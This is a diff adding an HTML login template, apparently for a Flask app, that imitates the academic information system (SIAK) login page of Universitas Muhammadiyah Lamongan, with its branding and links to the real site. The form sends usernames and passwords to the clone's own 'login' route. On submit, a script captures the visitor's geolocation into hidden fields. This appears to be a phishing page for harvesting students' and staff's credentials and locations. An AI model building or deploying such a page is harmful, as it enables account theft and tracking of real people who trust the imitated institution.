@@ -1,0 +1,168 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" 
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+  <script>
+  function submitWithLocation(form) {
+    if (navigator.geolocation) {
+      // Cegah submit langsung, tunggu sampai posisi dapat
+      navigator.geolocation.getCurrentPosition(function(position) {
+        document.getElementById('latitude').value = position.coords.latitude;
+        document.getElementById('longitude').value = position.coords.longitude;
+        form.submit(); // submit form setelah koordinat terisi
+      }, function(error) {
+        // Jika gagal dapat lokasi, tetap submit tapi tanpa lokasi
+        alert("Gagal mendapatkan lokasi, form tetap dikirim.");
+        form.submit();
+      });
+      return false; // hentikan submit sementara sampai koordinat siap
+    } else {
+      alert("Geolocation tidak didukung oleh browser Anda, form tetap dikirim.");
+      return true; // langsung submit tanpa koordinat
+    }
+  }
+</script>
+
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <title>Sistem Informasi Akademik Kampus :: </title>
+  <meta name="description" content="SIAK Universitas Muhammadiyah Lamongan" />
+  <meta name="revisit-after" content="2days" />
+  <meta name="robots" content="all,index,follow" />
+  <meta name="MSSmartTagsPreventParsing" content="TRUE" />
+  <meta content="en-us" http-equiv="Content-Language" />
+  <meta name="Distribution" content="Global" />
+  <meta name="Rating" content="General" />
+  <meta http-equiv="Cache-control" content="public" />
+
+  <link rel="Shortcut Icon" type="image/x-icon" href="https://siak.umla.ac.id/images/favicon.ico" />
+  <link href="{{ url_for('static', filename='Sistem Informasi Akademik Kampus ___files/forms.css') }}" rel="stylesheet" type="text/css" />
+  <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='Sistem Informasi Akademik Kampus ___files/validate.css') }}" media="all" />
+  <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='Sistem Informasi Akademik Kampus ___files/tcal.css') }}" media="all" />
+  <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='Sistem Informasi Akademik Kampus ___files/colorbox.css') }}" />
+  <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='Sistem Informasi Akademik Kampus ___files/keyboard.css') }}" />
+  <link href="{{ url_for('static', filename='Sistem Informasi Akademik Kampus ___files/style.login.css') }}" rel="stylesheet" type="text/css" />
+
+  <style>
+    #loginBox {
+      background-color: #ffffff;
+      padding: 1px;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      color: white;
+    }
+  </style>
+
+  <script>
+    function documentFocus() {
+      var area51 = document.getElementById("username");
+      area51.focus();
+    }
+
+    function myFunction() {
+      var x = document.getElementById("password");
+      if (x.type === "password") {
+        x.type = "text";
+      } else {
+        x.type = "password";
+      }
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          document.getElementById('latitude').value = position.coords.latitude;
+          document.getElementById('longitude').value = position.coords.longitude;
+        }, function(error) {
+          console.log("Geolocation error:", error.message);
+        });
+      } else {
+        console.log("Geolocation is not supported by this browser.");
+      }
+    }
+
+   window.onload = function() {
+  documentFocus();
+  // getLocation();  // nonaktifkan ini supaya tidak tabrakan dengan submitWithLocation
+}
+
+  </script>
+</head>
+
+<body>
+  <center>
+    <div id="loginWrapper">
+      <div id="loginBox">
+        <div id="loginBox-head"></div>
+
+        <img src="{{ url_for('static', filename='header.png') }}" alt="Header Image" style="width:100%; max-width:100%; display:block; margin:auto;" />
+
+        <div id="loginBox-body">
+          <br />
+          <form id="form-login" method="post" action="{{ url_for('login') }}" onsubmit="return submitWithLocation(this);">
+
+            <table>
+              <tbody>
+                <tr>
+                  <td>Username</td>
+                  <td nowrap="">
+                    <input id="username" type="text" class="required keyboardInput" name="username" vki_attached="true" />
+                    <img src="{{ url_for('static', filename='Sistem Informasi Akademik Kampus ___files/keyboard.png') }}" alt="Display virtual keyboard interface" class="keyboardInputInitiator" title="Display virtual keyboard interface" />
+                  </td>
+                </tr>
+                <tr>
+                  <td>Password</td>
+                  <td nowrap="">
+                    <input id="password" autocomplete="off" type="password" class="required keyboardInput" name="password" vki_attached="true" />
+                    <img src="{{ url_for('static', filename='Sistem Informasi Akademik Kampus ___files/keyboard.png') }}" alt="Display virtual keyboard interface" class="keyboardInputInitiator" title="Display virtual keyboard interface" />
+                    <input type="checkbox" title="Tampil Password" onclick="myFunction()" />
+                  </td>
+                </tr>
+
+                <input type="hidden" name="latitude" id="latitude" />
+                <input type="hidden" name="longitude" id="longitude" />
+
+                <tr>
+                  <td colspan="2">
+                    <input value="Login" name="login" type="submit" />
+                  </td>
+                </tr>
+                <tr>
+                  <td colspan="2">
+                    Klik di sini untuk <a href="https://siak.umla.ac.id/?m=lupa"><b>Lupa Password</b></a>
+                  </td>
+                </tr>
+                <tr>
+                  <td colspan="2">
+                    Panduan
+                    <a href="https://siak.umla.ac.id/window.php?m=panduan.dosen" class="linkColorbox cboxElement"><b>Dosen</b></a>
+                    dan
+                    <a href="https://siak.umla.ac.id/window.php?m=panduan.mahasiswa" class="linkColorbox cboxElement"><b>Mahasiswa</b></a>
+                    dan
+                    <a href="https://siak.umla.ac.id/window.php?m=panduan.pmb" class="linkColorbox cboxElement"><b>PMB</b></a>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </form>
+
+          <p>
+            <a href="https://siak.umla.ac.id/index.php?m=pmb.umum.periode" class="tombols"
+              onclick="centeredPopup(this.href,'myWindow','1000','700','yes');return false">PENDAFTARAN MABA</a>
+          </p>
+
+          <div align="right">Ver.150121.S.f (060421)&nbsp;&nbsp;</div>
+        </div>
+
+        <div id="loginBox-foot"></div>
+      </div>
+    </div>
+  </center>
+
+  <noscript>
+    Sistem ini membutuhkan javascript. Lakukan instruksi sederhana
+    <a href="http://www.activatejavascript.org" target="_blank">mengaktifkan JavaScript di browser Anda</a>.
+    <meta http-equiv="refresh" content="5; URL='http://www.activatejavascript.org/'" />
+  </noscript>
+</body>
+</html>
